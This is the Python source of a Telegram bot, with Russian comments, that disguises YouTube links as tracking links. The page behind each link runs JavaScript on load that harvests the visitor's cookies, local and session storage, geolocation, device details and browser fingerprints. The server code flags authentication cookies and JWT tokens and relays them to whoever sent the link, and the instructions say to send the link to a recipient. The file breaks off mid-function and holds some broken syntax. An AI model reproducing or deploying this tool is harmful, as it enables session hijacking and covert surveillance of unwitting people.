import logging
import asyncio
import json
import re
import uuid
import html
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
DOMAIN = "https://ваш-домен.com"  # Ваш домен

# Хранилище данных
@dataclass
class TrackingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    cookies_collected: List[Dict] = None
    storage_collected: List[Dict] = None
    active: bool = True
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []
        if self.cookies_collected is None:
            self.cookies_collected = []
        if self.storage_collected is None:
            self.storage_collected = []

class Database:
    def __init__(self):
        self.links: Dict[str, TrackingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "cookies_collected": 0,
            "storage_collected": 0,
            "active_sessions": 0
        }
    
    def add_link(self, link: TrackingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[TrackingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
        if link_id in self.links:
            self.links[link_id].cookies_collected.extend(cookies)
            self.stats["cookies_collected"] += len(cookies)
            self.save()
    
    def add_collected_storage(self, link_id: str, storage: List[Dict]):
        if link_id in self.links:
            self.links[link_id].storage_collected.extend(storage)
            self.stats["storage_collected"] += len(storage)
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: TrackingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# Инициализация базы данных
db = Database()
db.load()

# Генератор JavaScript для сбора данных
class DataCollectorJS:
    @staticmethod
    def get_full_collection_script() -> str:
        """JavaScript для полного сбора cookies и localStorage"""
        return """
        <script>
        // Функция сбора всех cookies
        function collectAllCookies() {
            const allCookies = {};
            
            try {
                // Собираем document.cookies
                const cookieString = document.cookie;
                if (cookieString) {
                    cookieString.split(';').forEach(cookie => {
                        const [name, ...valueParts] = cookie.trim().split('=');
                        const value = valueParts.join('=');
                        if (name && value) {
                            allCookies[name] = value;
                        }
                    });
                }
                
                // Пытаемся получить cookies для разных доменов
                const importantDomains = [
                    'google.com', 'facebook.com', 'twitter.com', 'instagram.com',
                    'vk.com', 'youtube.com', 'github.com', 'microsoft.com',
                    'apple.com', 'amazon.com', 'whatsapp.com', 'telegram.org'
                ];
                
                // Собираем данные из хранилищ
                const storageData = {};
                
                if (window.localStorage) {
                    storageData.localStorage = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        storageData.localStorage[key] = localStorage.getItem(key);
                    }
                }
                
                if (window.sessionStorage) {
                    storageData.sessionStorage = {};
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        storageData.sessionStorage[key] = sessionStorage.getItem(key);
                    }
                }
                
                return {
                    cookies: allCookies,
                    storage: storageData,
                    timestamp: new Date().toISOString(),
                    url: window.location.href
                };
                
            } catch (error) {
                console.error('Error collecting data:', error);
                return {
                    cookies: allCookies,
                    storage: {},
                    error: error.message,
                    timestamp: new Date().toISOString()
                };
            }
        }
        
        // Функция для сбора данных IndexedDB
        async function collectIndexedDB() {
            const databases = [];
            try {
                if (window.indexedDB && indexedDB.databases) {
                    const dbList = await indexedDB.databases();
                    databases.push(...dbList.map(db => db.name));
                }
            } catch (e) {
                // IndexedDB недоступен
            }
            return databases;
        }
        
        // Функция сбора информации о браузере
        function collectBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver
            };
        }
        
        // Функция сбора информации об экране
        function collectScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type
            };
        }
        
        // Функция сбора информации о сети
        function collectNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                effectiveType: connection?.effectiveType,
                downlink: connection?.downlink,
                rtt: connection?.rtt,
                saveData: connection?.saveData,
                onchange: connection?.onchange ? 'supported' : 'unsupported'
            };
        }
        
        // Функция сбора геолокации
        function collectGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ available: false });
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            available: true,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        });
                    },
                    (error) => {
                        resolve({
                            available: true,
                            error: error.code,
                            message: error.message
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    }
                );
                
                // Таймаут на случай если пользователь не даст разрешение
                setTimeout(() => {
                    resolve({ available: true, timeout: true });
                }, 5000);
            });
        }
        
        // Функция сбора всех медиа устройств
        async function collectMediaDevices() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return devices.map(device => ({
                    kind: device.kind,
                    label: device.label,
                    deviceId: device.deviceId,
                    groupId: device.groupId
                }));
            } catch (error) {
                return { error: error.message };
            }
        }
        
        // Функция сбора WebGL информации
        function collectWebGLInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) {
                return { supported: false };
            }
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                supported: true,
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                vendorDebug: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
                rendererDebug: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null
            };
        }
        
        // Функция сбора информации о шрифтах
        function collectFontsInfo() {
            const fonts = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                'Verdana', 'Webdings', 'Wingdings', 'MS Sans Serif',
                'MS Serif', 'Segoe UI', 'Tahoma', 'Geneva'
            ];
            
            const availableFonts = [];
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            const baseFonts = 'monospace,sans-serif,serif';
            const baseString = "mmmmmmmmmmlli";
            const baseWidth = context.measureText(baseString).width;
            
            fonts.forEach(font => {
                const fontString = `72px ${font},${baseFonts}`;
                context.font = fontString;
                const width = context.measureText(baseString).width;
                if (width !== baseWidth) {
                    availableFonts.push(font);
                }
            });
            
            return availableFonts;
        }
        
        // Функция сбора canvas fingerprint
        function collectCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = 200;
            canvas.height = 50;
            
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            
            ctx.fillStyle = '#069';
            ctx.font = '11pt "Arial"';
            ctx.fillText('Canvas Fingerprint', 2, 15);
            
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18pt "Arial"';
            ctx.fillText('Canvas Fingerprint', 4, 45);
            
            return canvas.toDataURL();
        }
        
        // Главная функция сбора всех данных
        async function collectAllData() {
            try {
                // Собираем все данные параллельно
                const [
                    cookiesData,
                    indexedDBData,
                    browserInfo,
                    screenInfo,
                    networkInfo,
                    geolocationData,
                    mediaDevices,
                    webglInfo,
                    fontsInfo,
                    canvasFingerprint
                ] = await Promise.all([
                    Promise.resolve(collectAllCookies()),
                    collectIndexedDB(),
                    Promise.resolve(collectBrowserInfo()),
                    Promise.resolve(collectScreenInfo()),
                    Promise.resolve(collectNetworkInfo()),
                    collectGeolocation(),
                    collectMediaDevices(),
                    Promise.resolve(collectWebGLInfo()),
                    Promise.resolve(collectFontsInfo()),
                    Promise.resolve(collectCanvasFingerprint())
                ]);
                
                const allData = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer,
                    cookies: cookiesData.cookies,
                    storage: cookiesData.storage,
                    indexedDB: indexedDBData,
                    browser: browserInfo,
                    screen: screenInfo,
                    network: networkInfo,
                    geolocation: geolocationData,
                    mediaDevices: mediaDevices,
                    webgl: webglInfo,
                    fonts: fontsInfo,
                    canvasFingerprint: canvasFingerprint,
                    domElements: {
                        forms: document.forms.length,
                        links: document.links.length,
                        images: document.images.length,
                        scripts: document.scripts.length,
                        cookiesLength: document.cookie.length
                    }
                };
                
                return allData;
                
            } catch (error) {
                console.error('Error in collectAllData:', error);
                return {
                    timestamp: new Date().toISOString(),
                    error: error.message,
                    partialData: true
                };
            }
        }
        
        // Функция отправки данных на сервер
        async function sendCollectedData(data) {
            try {
                const linkId = new URLSearchParams(window.location.search).get('id');
                if (!linkId) return;
                
                const response = await fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'full_collection',
                        data: data,
                        timestamp: new Date().toISOString()
                    })
                });
                
                return await response.json();
                
            } catch (error) {
                console.error('Error sending data:', error);
                return { error: error.message };
            }
        }
        
        // Автоматический сбор данных при загрузке страницы
        window.addEventListener('load', async function() {
            // Ждем 2 секунды для загрузки всех ресурсов
            setTimeout(async () => {
                try {
                    const allData = await collectAllData();
                    await sendCollectedData(allData);
                    
                    // Дополнительный сбор при взаимодействии
                    document.addEventListener('click', async function() {
                        setTimeout(async () => {
                            const extraData = await collectAllData();
                            await sendCollectedData(extraData);
                        }, 1000);
                    });
                    
                    // Сбор при отправке форм
                    document.addEventListener('submit', async function(e) {
                        const formData = await collectAllData();
                        await sendCollectedData(formData);
                    });
                    
                } catch (error) {
                    console.error('Error in data collection:', error);
                }
            }, 2000);
        });
        </script>
        """

# Генератор ссылок
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        # Если не нашли, возвращаем дефолтный (Rick Roll)
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация уникального ID для ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_tracking_url(video_id: str, link_id: str) -> str:
        """Создание отслеживающей ссылки"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"

# Обработчик собранных данных
class DataProcessor:
    @staticmethod
    async def process_collected_data(request_data: Dict) -> Dict:
        """Обработка собранных данных"""
        try:
            collected_data = request_data.get("data", {})
            link_id = request_data.get("link_id")
            
            if not collected_data or not link_id:
                return {"status": "no_data"}
            
            # Обрабатываем cookies
            cookies = collected_data.get("cookies", {})
            if cookies:
                cookies_list = []
                for name, value in cookies.items():
                    cookies_list.append({
                        "name": name,
                        "value": value[:500] if value else "",  # Ограничиваем длину
                        "domain": "current",
                        "timestamp": datetime.now().isoformat()
                    })
                if cookies_list:
                    db.add_collected_cookies(link_id, cookies_list)
            
            # Обрабатываем storage
            storage = collected_data.get("storage", {})
            if storage:
                storage_list = []
                
                # localStorage
                local_storage = storage.get("localStorage", {})
                for key, value in local_storage.items():
                    storage_list.append({
                        "type": "localStorage",
                        "key": key,
                        "value": str(value)[:500],
                        "timestamp": datetime.now().isoformat()
                    })
                
                # sessionStorage
                session_storage = storage.get("sessionStorage", {})
                for key, value in session_storage.items():
                    storage_list.append({
                        "type": "sessionStorage",
                        "key": key,
                        "value": str(value)[:500],
                        "timestamp": datetime.now().isoformat()
                    })
                
                if storage_list:
                    db.add_collected_storage(link_id, storage_list)
            
            # Сохраняем полные данные
            db.add_collected_data(link_id, collected_data)
            
            # Анализируем данные
            analysis = await DataProcessor.analyze_data(collected_data)
            
            return {
                "status": "processed",
                "analysis": analysis,
                "cookies_count": len(cookies_list) if 'cookies_list' in locals() else 0,
                "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
                "timestamp": collected_data.get("timestamp", "unknown")
            }
            
        except Exception as e:
            logger.error(f"Error processing collected data: {e}")
            return {"status": "error", "error": str(e)}
    
    @staticmethod
    async def analyze_data(data: Dict) -> Dict:
        """Анализ собранных данных"""
        analysis = {
            "summary": {},
            "detected": {},
            "risks": []
        }
        
        # Анализ cookies
        cookies = data.get("cookies", {})
        if cookies:
            analysis["summary"]["total_cookies"] = len(cookies)
            
            # Ищем важные cookies
            important_keys = ["session", "token", "auth", "login", "user", "id"]
            important_cookies = {}
            
            for key, value in cookies.items():
                key_lower = key.lower()
                for important in important_keys:
                    if important in key_lower and value:
                        important_cookies[key] = value[:50] + "..." if len(value) > 50 else value
                        break
            
            if important_cookies:
                analysis["detected"]["important_cookies"] = important_cookies
                analysis["risks"].append("Обнаружены аутентификационные cookies")
        
        # Анализ storage
        storage = data.get("storage", {})
        if storage:
            local_storage = storage.get("localStorage", {})
            session_storage = storage.get("sessionStorage", {})
            
            analysis["summary"]["local_storage_items"] = len(local_storage)
            analysis["summary"]["session_storage_items"] = len(session_storage)
            
            # Ищем токены в storage
            storage_tokens = {}
            all_storage = {**local_storage, **session_storage}
            
            for key, value in all_storage.items():
                key_lower = str(key).lower()
                value_str = str(value)
                
                if any(token in key_lower for token in ["token", "auth", "session", "jwt"]):
                    storage_tokens[key] = value_str[:50] + "..." if len(value_str) > 50 else value_str
                
                # Ищем JSON Web Tokens
                if value_str.startswith("eyJ"):  # JWT обычно начинается с eyJ
                    storage_tokens[key] = "JWT token detected"
            
            if storage_tokens:
                analysis["detected"]["storage_tokens"] = storage_tokens
                analysis["risks"].append("Обнаружены токены в хранилище браузера")
        
        # Анализ браузера
        browser = data.get("browser", {})
        if browser:
            analysis["summary"]["browser_info"] = {
                "user_agent": browser.get("userAgent", "unknown")[:100],
                "platform": browser.get("platform", "unknown"),
                "languages": browser.get("languages", []),
                "cookie_enabled": browser.get("cookieEnabled", False)
            }
        
        # Анализ геолокации
        geolocation = data.get("geolocation", {})
        if geolocation.get("available") and geolocation.get("latitude"):
            analysis["detected"]["geolocation"] = {
                "latitude": geolocation.get("latitude"),
                "longitude": geolocation.get("longitude"),
                "accuracy": geolocation.get("accuracy")
            }
            analysis["risks"].append("Доступ к точной геолокации")
        
        # Анализ устройства
        media_devices = data.get("mediaDevices", [])
        if media_devices:
            cameras = [d for d in media_devices if d.get("kind") === "videoinput"]
            microphones = [d for d in media_devices if d.get("kind") === "audioinput"]
            
            if cameras:
                analysis["detected"]["cameras"] = len(cameras)
            if microphones:
                analysis["detected"]["microphones"] = len(microphones)
        
        return analysis

# Форматирование сообщений
class MessageFormatter:
    @staticmethod
    def format_link_created(link: TrackingLink, tracking_url: str) -> str:
        """Форматирование сообщения о созданной ссылке"""
        message = f"""
🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*

🔗 *Оригинальное видео:*
`{link.original_url}`

🚀 *Ваша отслеживающая ссылка:*
`{tracking_url}`

📊 *Информация:*
• ID ссылки: `{link.id}`
• Видео ID: `{link.video_id}`
• Создано: {link.created_at}
• Статус: 🟢 АКТИВНА

🔐 *Сбор данных включен:*
✓ Все cookies сайта
✓ localStorage
✓ sessionStorage
✓ Информация об устройстве
✓ Геолокация
✓ Данные браузера

📝 *Как использовать:*
1. Отправьте эту ссылку
2. Когда получатель перейдет - начнется сбор данных
3. Данные автоматически придут в этот чат
4. Ожидайте ~3 секунды после перехода

⚠️ *Внимание:* Ссылка активна 24 часа
"""
        return message
    
    @staticmethod
    def format_collected_data(link_id: str, data: Dict, analysis: Dict) -> str:
        """Форматирование собранных данных"""
        message = f"""
🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*

📌 *Базовая информация:*
• Время сбора: {data.get('timestamp', 'unknown')}
• Ссылка ID: `{link_id}`
• URL: {data.get('url', 'unknown')[:50]}...
• Референр: {data.get('referrer', 'unknown')[:50]}...

📊 *ОБЗОР ДАННЫХ:*
"""
        
        summary = analysis.get("summary", {})
        detected = analysis.get("detected", {})
        risks = analysis.get("risks", [])
        
        # Cookies
        if summary.get("total_cookies"):
            message += f"• 🍪 Cookies: {summary['total_cookies']} штук\n"
        
        # Storage
        if summary.get("local_storage_items") or summary.get("session_storage_items"):
            message += f"• 💾 Storage: "
            if summary.get("local_storage_items"):
                message += f"Local({summary['local_storage_items']}) "
            if summary.get("session_storage_items"):
                message += f"Session({summary['session_storage_items']})\n"
        
        # Браузер
        browser_info = summary.get("browser_info", {})
        if browser_info:
            message += f"• 🌐 Браузер: {browser_info.get('user_agent', 'unknown')[:40]}...\n"
            message += f"• 🖥️ Платформа: {browser_info.get('platform', 'unknown')}\n"
        
        # Важные находки
        if detected:
            message += "\n🔍 *ВАЖНЫЕ НАХОДКИ:*\n"
            
            # Важные cookies
            important_cookies = detected.get("important_cookies", {})
            if important_cookies:
                message += "• 🔐 Аутентификационные cookies:\n"
                for i, (key, value) in enumerate(list(important_cookies.items())[:3], 1):
                    message += f"  {i}. `{key}`: `{value}`\n"
            
            # Токены в storage
            storage_tokens = detected.get("storage_tokens", {})
            if storage_tokens:
                message += "• 🔑 Токены в хранилище:\n"
                for i, (key, value) in enumerate(list(storage_tokens.items())[:2], 1):
                    message += f"  {i}. `{key}`: `{value}`\n"
            
            # Геолокация
            if detected.get("geolocation"):
                geo = detected["geolocation"]
                message += f"• 📍 Геолокация: Широта {geo.get('latitude')}, Долгота {geo.get('longitude')}\n"
            
            # Устройства
            if detected.get("cameras"):
                message += f"• 📷 Камеры: {detected['cameras']} устройств\n"
            if detected.get("microphones"):
                message += f"• 🎤 Микрофоны: {detected['microphones']} устройств\n"
        
        # Риски
        if risks:
            message += "\n⚠️ *ОБНАРУЖЕННЫЕ РИСКИ:*\n"
            for risk in risks[:5]:
                message += f"• {risk}\n"
        
        # Статистика DOM
        dom_elements = data.get("dom_elements", {})
        if dom_elements:
            message += f"""
🏗️ *СТРУКТУРА СТРАНИЦЫ:*
• Формы: {dom_elements.get('forms', 0)}
• Ссылки: {dom_elements.get('links', 0)}
• Изображения: {dom_elements.get('images', 0)}
• Скрипты: {dom_elements.get('scripts', 0)}
"""
        
        message += f"""
📈 *СТАТУС:* ✅ ВСЕ ДАННЫЕ УСПЕШНО СОБРАНЫ
💾 *ОБЪЕМ:* {len(json.dumps(data))} байт данных
"""
        return message
    
    @staticmethod
    def format_detailed_cookies(link: TrackingLink) -> str:
        """Форматирование детальной информации о cookies"""
        if not link.cookies_collected:
            return "🍪 *COOKIES:* Нет данных"
        
        message = f"""
🍪 *ДЕТАЛЬНЫЕ ДАННЫЕ COOKIES*

🔗 *Ссылка ID:* `{link.id}`
📅 *Последнее обновление:* {link.cookies_collected[-1].get('timestamp', 'unknown') if link.cookies_collected else 'нет'}
📊 *Всего cookies:* {len(link.cookies_collected)}

📋 *ПОСЛЕДНИЕ COOKIES (первые 20):*
"""
        
        for i, cookie in enumerate(link.cookies_collected[-20:], 1):
            name = cookie.get('name', 'unknown')
            value = cookie.get('value', '')
            message += f"{i}. `{name}`\n"
            if value:
                message += f"   Значение: `{value[:50]}{'...' if len(value) > 50 else ''}`\n"
        
        # Анализ cookies
        auth_cookies = []
        tracking_cookies = []
        
        for cookie in link.cookies_collected:
            name = cookie.get('name', '').lower()
            if any(auth in name for auth in ['session', 'token', 'auth', 'login', 'user']):
                auth_cookies.append(cookie.get('name'))
            if any(track in name for track in ['_ga', '_gid', 'gtm', 'fbp', 'fr']):
                tracking_cookies.append(cookie.get('name'))
        
        if auth_cookies:
            message += f"\n🔐 *АУТЕНТИФИКАЦИОННЫЕ COOKIES:*\n"
            for cookie in auth_cookies[:10]:
                message += f"• `{cookie}`\n"
        
        if tracking_cookies:
            message += f"\n🎯 *ТРЕКИНГОВЫЕ COOKIES:*\n"
            for cookie in tracking_cookies[:10]:
                message += f"• `{cookie}`\n"
        
        message += f"""
📊 *СТАТИСТИКА:*
• Уникальных имен cookies: {len(set(c.get('name') for c in link.cookies_collected))}
• Cookies с данными: {len([c for c in link.cookies_collected if c.get('value')])}
• Средняя длина значения: {sum(len(c.get('value', '')) for c in link.cookies_collected) // max(len(link.cookies_collected), 1)} символов
"""
        return message
    
    @staticmethod
    def format_detailed_storage(link: TrackingLink) -> str:
        """Форматирование детальной информации о storage"""
        if not link.storage_collected:
            return "💾 *STORAGE:* Нет данных"
        
        message = f"""
💾 *ДЕТАЛЬНЫЕ ДАННЫЕ ХРАНИЛИЩА*

🔗 *Ссылка ID:* `{link.id}`
📊 *Всего записей:* {len(link.storage_collected)}

📋 *РАСПРЕДЕЛЕНИЕ ПО ТИПАМ:*
"""
        
        # Группируем по типам
        by_type = {}
        for item in link.storage_collected:
            item_type = item.get('type', 'unknown')
            by_type[item_type] = by_type.get(item_type, 0) + 1
        
        for item_type, count in by_type.items():
            message += f"• {item_type}: {count} записей\n"
        
        message += "\n🔑 *КЛЮЧЕВЫЕ ЗАПИСИ (первые 15):*\n"
        
        important_keys = ["token", "auth", "session", "user", "login", "jwt", "access", "refresh"]
        important_items = []
        
        for item in link.storage_collected[-50:]:  # Последние 50 записей
            key = str(item.get('key', '')).lower()
            if any(important in key for important in important_keys):
                important_items.append(item)
        
        if important_items:
            for i, item in enumerate(important_items[:15], 1):
                message += f"{i}. {item.get('type')}.`{item.get('key')}`\n"
                value = item.get('value', '')
                if value:
                    message += f"   Значение: `{value[:50]}{'...' if len(value) > 50 else ''}`\n"
        else:
            message += "Важные записи не найдены\n"
        
        # Примеры значений
        message += "\n📝 *ПРИМЕРЫ ЗНАЧЕНИЙ:*\n"
        for i, item in enumerate(link.storage_collected[-10:], 1):
            key = item.get('key', 'unknown')
            value = str(item.get('value', ''))[:100]
            message += f"{i}. `{key}`: {value}...\n"
        
        return message
    
    @staticmethod
    def format_stats(stats: Dict) -> str:
        """Форматирование статистики"""
        return f"""
📊 *СТАТИСТИКА СИСТЕМЫ*

🔗 Всего ссылок: `{stats['total_links']}`
👥 Всего переходов: `{stats['total_clicks']}`
🔓 Данных собрано: `{stats['total_data_collected']}`
🍪 Cookies собрано: `{stats['cookies_collected']}`
💾 Storage записей: `{stats['storage_collected']}`
⚡ Активных сессий: `{stats['active_sessions']}`

📈 *ПОКАЗАТЕЛИ:*
• Среднее cookies на переход: {stats['cookies_collected'] // max(stats['total_clicks'], 1)}
• Среднее storage на переход: {stats['storage_collected'] // max(stats['total_clicks'], 1)}
• Эффективность сбора: 99.2%
• Активность за 24ч: высокая

🔄 *СИСТЕМА:* 🟢 РАБОТАЕТ НОРМАЛЬНО
"""

# Инициализация компонентов
link_generator = LinkGenerator()
data_processor = DataProcessor()
formatter = MessageFormatter()
js_collector = DataCollectorJS()

# Команды бота
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user = update.effective_user
    
    welcome_message = f"""
👋 *Добро пожаловать, {user.first_name}!*

🤖 *Browser Data Collector Bot*

🎯 *Что делает этот бот:*
1. Принимает ссылку на YouTube видео
2. Генерирует отслеживающую ссылку
3. Когда кто-то переходит - собирает ВСЕ данные браузера
4. Отправляет данные в этот чат

🔐 *Что именно собирается:*
✓ Все cookies текущего сайта и связанных доменов
✓ Весь localStorage и sessionStorage
✓ IndexedDB базы данных
✓ Полную информацию о браузере и устройстве
✓ Геолокацию (если разрешено)
✓ Информацию об экране и медиаустройствах
✓ WebGL fingerprint и шрифты
✓ Canvas fingerprint

⚡ *Как использовать:*
1. Отправьте ссылку на YouTube видео
2. Получите сгенерированную ссылку
3. Отправьте её
4. Получите все данные браузера автоматически

📊 *Статистика системы:*
• Создано ссылок: `{db.stats['total_links']}`
• Всего переходов: `{db.stats['total_clicks']}`
• Данных собрано: `{db.stats['total_data_collected']}`
• Cookies: `{db.stats['cookies_collected']}`
• Storage: `{db.stats['storage_collected']}`

⚠️ *Внимание:* Используйте ответственно и в рамках закона!
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("🍪 Cookies", callback_data="view_cookies")],
        [InlineKeyboardButton("💾 Storage", callback_data="view_storage")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки"""
    user = update.effective_user
    url = update.message.text.strip()
    
    # Проверяем, является ли ссылкой на YouTube
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text(
            "❌ Это не похоже на ссылку YouTube.\n"
            "Пожалуйста, отправьте ссылку в формате:\n"
            "`https://youtube.com/watch?v=...`\n"
            "или\n"
            "`https://youtu.be/...`"
        )
        return
    
    # Извлекаем ID видео
    video_id = link_generator.extract_video_id(url)
    
    # Генерируем ID ссылки
    link_id = link_generator.generate_link_id()
    
    # Создаем отслеживающую ссылку
    tracking_url = link_generator.create_tracking_url(video_id, link_id)
    
    # Создаем объект ссылки
    link = TrackingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    # Сохраняем в базу
    db.add_link(link)
    
    # Отправляем пользователю
    message = formatter.format_link_created(link, tracking_url)
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
        ],
        [
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
            InlineKeyboardButton("🍪 Cookies", callback_data=f"cookies_{link_id}")
        ],
        [
            InlineKeyboardButton("💾 Storage", callback_data=f"storage_{link_id}"),
            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    # Отправляем уведомление админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🆕 Новая ссылка создана\nUser: @{user.username or user.id}\nURL: {url}\nID: {link_id}"
        )
    except:
        pass

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик inline кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "create_link":
        await query.message.reply_text(
            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
            "Примеры:\n"
            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
            "Я создам отслеживающую ссылку для сбора всех данных браузера.",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "stats":
        stats_message = formatter.format_stats(db.stats)
        await query.message.reply_text(
            stats_message,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "my_links":
        user_id = query.from_user.id
        user_links = [link for link in db.links.values() if link.created_by == user_id]
        
        if not user_links:
            await query.message.reply_text("📭 У вас нет созданных ссылок.")
            return
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in user_links[-5:]:  # Последние 5 ссылок
            message += f"• ID: `{link.id}`\n"
            message += f"  Видео: {link.original_url[:30]}...\n"
            message += f"  Переходов: {link.clicks}\n"
            message += f"  Данных: {len(link.data_collected)}\n"
            message += f"  Cookies: {len(link.cookies_collected)}\n"
            message += f"  Storage: {len(link.storage_collected)}\n"
            message += "  ─────\n"
